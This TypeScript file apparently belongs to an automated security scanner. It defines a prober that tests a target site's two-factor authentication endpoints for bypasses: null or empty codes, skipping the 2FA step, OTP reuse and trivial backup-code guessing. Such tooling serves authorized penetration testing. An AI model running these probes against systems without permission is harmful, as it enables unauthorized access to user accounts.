import axios from "axios";
import logger from "../../utils/logger";

interface TwoFAVuln {
  technique: "response_manipulation" | "step_skip" | "code_reuse" | "backup_code_brute" | "null_code";
  endpoint: string;
  severity: "critical" | "high";
  detail: string;
}

interface TwoFAResult {
  vulns: TwoFAVuln[];
  hypotheses: Array<{ vulnClass: string; reasoning: string; confidence: number; priority: number }>;
}

const TWOFA_ENDPOINTS = [
  "/api/2fa/verify",
  "/api/mfa/verify",
  "/api/otp/verify",
  "/verify-otp",
  "/api/auth/2fa",
  "/login/2fa",
];

const PROTECTED_RESOURCES = ["/api/me", "/api/dashboard"];

function isAccepted(status: number): boolean {
  return status === 200 || status === 204;
}

function hasUserData(data: unknown): boolean {
  if (!data || typeof data !== "object") return false;
  const obj = data as Record<string, unknown>;
  const userFields = ["id", "user", "username", "email", "name", "userId", "user_id", "profile"];
  return userFields.some((field) => field in obj);
}

function toHypothesis(
  technique: string,
  severity: "critical" | "high"
): { vulnClass: string; reasoning: string; confidence: number; priority: number } {
  return {
    vulnClass: "auth_bypass",
    reasoning: `2FA bypass via ${technique} — authentication second factor can be circumvented`,
    confidence: severity === "critical" ? 0.8 : 0.7,
    priority: severity === "critical" ? 10 : 8,
  };
}

class TwoFactorBypassProber {
  async probe(targetUrl: string, authHeaders?: Record<string, string>): Promise<TwoFAResult> {
    const vulns: TwoFAVuln[] = [];
    const baseUrl = targetUrl.replace(/\/$/, "");
    const headers = { "Content-Type": "application/json", ...(authHeaders ?? {}) };
    const axiosOpts = { timeout: 5000, validateStatus: () => true };

    // Detect active 2FA endpoints
    const activeEndpoints: string[] = [];
    for (const ep of TWOFA_ENDPOINTS) {
      try {
        const res = await axios.post(`${baseUrl}${ep}`, {}, { ...axiosOpts, headers });
        if (res.status !== 404) {
          activeEndpoints.push(ep);
          logger.debug(`[2FA] Detected endpoint: ${ep} (status ${res.status})`);
        }
      } catch (err) {
        logger.debug(`[2FA] Error probing ${ep}: ${err}`);
      }
    }

    for (const ep of activeEndpoints) {
      const url = `${baseUrl}${ep}`;

      // 1. Null code
      try {
        const res = await axios.post(
          url,
          { code: null, otp: null, token: null },
          { ...axiosOpts, headers }
        );
        if (isAccepted(res.status)) {
          const vuln: TwoFAVuln = {
            technique: "null_code",
            endpoint: ep,
            severity: "critical",
            detail: `Endpoint ${ep} accepted null code/otp/token (status ${res.status})`,
          };
          vulns.push(vuln);
          logger.warn(`[2FA] null_code vuln at ${ep}`);
        }
      } catch (err) {
        logger.debug(`[2FA] null_code test error at ${ep}: ${err}`);
      }

      // 2. Empty string code
      try {
        const res = await axios.post(
          url,
          { code: "", otp: "" },
          { ...axiosOpts, headers }
        );
        if (isAccepted(res.status)) {
          const vuln: TwoFAVuln = {
            technique: "response_manipulation",
            endpoint: ep,
            severity: "critical",
            detail: `Endpoint ${ep} accepted empty string code/otp (status ${res.status})`,
          };
          vulns.push(vuln);
          logger.warn(`[2FA] response_manipulation (empty string) vuln at ${ep}`);
        }
      } catch (err) {
        logger.debug(`[2FA] empty string test error at ${ep}: ${err}`);
      }

      // 3. Step skip — access protected resources without completing 2FA
      for (const resource of PROTECTED_RESOURCES) {
        try {
          const resGet = await axios.get(`${baseUrl}${resource}`, { ...axiosOpts, headers });
          if (resGet.status === 200 && hasUserData(resGet.data)) {
            const vuln: TwoFAVuln = {
              technique: "step_skip",
              endpoint: resource,
              severity: "critical",
              detail: `Protected resource ${resource} accessible without completing 2FA (status ${resGet.status})`,
            };
            vulns.push(vuln);
            logger.warn(`[2FA] step_skip vuln — ${resource} accessible without 2FA`);
            break;
          }
        } catch (err) {
          logger.debug(`[2FA] step_skip GET ${resource} error: ${err}`);
        }
        try {
          const resPost = await axios.post(
            `${baseUrl}${resource}`,
            {},
            { ...axiosOpts, headers }
          );
          if (resPost.status === 200 && hasUserData(resPost.data)) {
            const vuln: TwoFAVuln = {
              technique: "step_skip",
              endpoint: resource,
              severity: "critical",
              detail: `Protected resource ${resource} accessible via POST without completing 2FA (status ${resPost.status})`,
            };
            vulns.push(vuln);
            logger.warn(`[2FA] step_skip (POST) vuln — ${resource} accessible without 2FA`);
            break;
          }
        } catch (err) {
          logger.debug(`[2FA] step_skip POST ${resource} error: ${err}`);
        }
      }

      // 4. Code reuse — submit same code twice
      try {
        const code = "123456";
        await axios.post(url, { code }, { ...axiosOpts, headers });
        const res2 = await axios.post(url, { code }, { ...axiosOpts, headers });
        if (isAccepted(res2.status)) {
          const vuln: TwoFAVuln = {
            technique: "code_reuse",
            endpoint: ep,
            severity: "high",
            detail: `Endpoint ${ep} accepted the same OTP code on second submission (status ${res2.status})`,
          };
          vulns.push(vuln);
          logger.warn(`[2FA] code_reuse vuln at ${ep}`);
        }
      } catch (err) {
        logger.debug(`[2FA] code_reuse test error at ${ep}: ${err}`);
      }

      // 5. Backup code brute
      const backupCodes = ["00000000", "12345678", "11111111"];
      for (const backup_code of backupCodes) {
        try {
          const res = await axios.post(url, { backup_code }, { ...axiosOpts, headers });
          if (isAccepted(res.status)) {
            const vuln: TwoFAVuln = {
              technique: "backup_code_brute",
              endpoint: ep,
              severity: "high",
              detail: `Endpoint ${ep} accepted backup code "${backup_code}" (status ${res.status})`,
            };
            vulns.push(vuln);
            logger.warn(`[2FA] backup_code_brute vuln at ${ep} with code ${backup_code}`);
            break;
          }
        } catch (err) {
          logger.debug(`[2FA] backup_code_brute test error at ${ep} code ${backup_code}: ${err}`);
        }
      }
    }

    const hypotheses = vulns.map((v) => toHypothesis(v.technique, v.severity));

    return { vulns, hypotheses };
  }
}

export const twoFactorBypassProber = new TwoFactorBypassProber();
